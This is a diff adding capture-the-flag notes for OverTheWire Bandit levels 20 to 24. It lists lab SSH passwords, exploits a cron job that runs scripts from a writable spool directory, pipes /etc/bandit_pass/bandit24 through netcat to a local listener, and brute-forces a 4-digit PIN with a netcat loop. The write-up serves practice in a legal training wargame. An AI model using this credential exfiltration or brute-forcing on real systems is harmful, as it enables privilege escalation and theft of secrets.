@@ -302,7 +302,134 @@ Allows the process to _temporarily_ raise and lower privileges as it needs.
 ```
 ssh -p 2220 bandit20@bandit.labs.overthewire.org
 GbKksEFF4yrVs6il55v6gwY5aVje5f0j
+```
 
+### LV20
 
+{% hint style="info" %}
+microservices
+{% endhint %}
 
 ```
+ssh -p 2220 bandit21@bandit.labs.overthewire.org
+gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr
+
+ssh -p 2220 bandit22@bandit.labs.overthewire.org
+Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
+
+ssh -p 2220 bandit23@bandit.labs.overthewire.org
+jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
+```
+
+### LV23
+
+```
+stat /usr/bin/cronjob_bandit23.sh
+Access: (0750/-rwxr-x---)  Uid: (11023/bandit23)   Gid: (11022/bandit22)
+
+stat /usr/bin/cronjob_bandit24.sh
+Access: (0750/-rwxr-x---)  Uid: (11024/bandit24)   Gid: (11023/bandit23)
+```
+
+```bash
+#!/bin/bash
+
+myname=bandit24
+
+cd /var/spool/$myname
+echo "Executing and deleting all scripts in /var/spool/$myname:"
+for i in * .*;
+do
+    if [ "$i" != "." -a "$i" != ".." ];
+    then
+        echo "Handling $i"
+        owner="$(stat --format "%U" ./$i)"
+        if [ "${owner}" = "bandit23" ]; then
+            timeout -s 9 60 ./$i
+        fi
+        rm -f ./$i
+    fi
+done
+```
+
+Ok something is going on in folder:\
+`/var/spool/bandit24`
+
+```
+stat /var/spool/bandit24/
+Access: (0773/drwxrwx-wx)  Uid: (    0/    root)   Gid: (11024/bandit24)
+```
+
+`That wx...`
+
+```
+timeout -s 9 60 ./$i
+
+kill -l
+
+Uh...
+```
+
+{% hint style="warning" %}
+The script is executed and after 60 second receive a SIGKILL
+{% endhint %}
+
+{% hint style="info" %}
+What could I do if I was bandit24 for 60 second?&#x20;
+{% endhint %}
+
+I could send text to a microservices...
+
+```
+# listen port on bandit23
+nc -l -p 5001
+```
+
+```
+# script executed by bandit24
+echo "ciao" | nc 127.0.0.1 5001
+```
+
+Well... Now, should be easy...
+
+<details>
+
+<summary>spoiler</summary>
+
+```
+cat /etc/bandit_pass/bandit24 | nc 127.0.0.1 5001
+```
+
+</details>
+
+```
+ssh -p 2220 bandit24@bandit.labs.overthewire.org
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+```
+
+### LV24
+
+<details>
+
+<summary>spoiler</summary>
+
+```bash
+for i in {0000..9999}; do
+    echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i" 
+done
+```
+
+```bash
+  echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0000" | nc 127.0.0.1 30002
+```
+
+```bash
+!/bin/bash
+
+for i in {0000..9999}; do
+        echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i" | nc 127.0.0.1 30002 &
+        # sleep 1 &
+done
+```
+
+</details>
